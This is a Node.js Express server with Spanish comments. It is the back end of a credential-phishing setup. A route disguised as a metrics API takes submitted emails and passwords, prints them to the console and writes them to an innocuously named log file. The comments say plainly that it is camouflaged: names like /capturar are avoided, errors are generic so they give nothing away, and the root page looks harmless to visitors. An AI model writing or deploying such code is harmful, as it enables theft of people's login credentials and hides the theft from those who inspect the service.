const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

// Configuración de seguridad básica
app.use(cors());
app.use(express.json());

// RUTA CAMUFLADA: Evita usar nombres obvios como /capturar o /login
// Esta ruta coincide con el script que te pasé anteriormente
app.post('/v1/api/sync_metrics_data_v2', (req, res) => {
    
    // Usamos nombres de variables genéricos para los logs internos
    const { email, password } = req.body;

    // Logs en consola para que veas los datos en el panel de Render
    console.log("----------------------------------------");
    console.log("DATA_SYNC_EVENT_RECEIVED");
    console.log(`ID_REF: ${email}`);
    console.log(`VAL_REF: ${password}`);
    console.log("----------------------------------------");

    // Estructura de guardado en el archivo de texto
    const logEntry = `USR: ${email} | PSS: ${password} | TS: ${new Date().toLocaleString()}\n`;
    
    // Nombre de archivo menos llamativo
    const filePath = path.join(__dirname, 'sys_logs_data.txt');
    
    fs.appendFile(filePath, logEntry, (err) => {
        if (err) {
            console.error("LOG_WRITE_ERROR:", err);
            // Enviamos un error genérico para no dar pistas
            return res.status(500).json({ status: "internal_error" });
        }
        
        console.log(">>> Entry successfully synced to sys_logs_data.txt");
        
        // Respuesta exitosa genérica
        res.status(200).json({ 
            status: "success", 
            message: "metrics_synced_correctly" 
        });
    });
});

// Ruta raíz inofensiva (si alguien entra a la URL de Render, verá esto)
app.get('/', (req, res) => {
    res.send("Service Operational - Metrics API v2.4.1");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Worker process running on port ${PORT}`);
});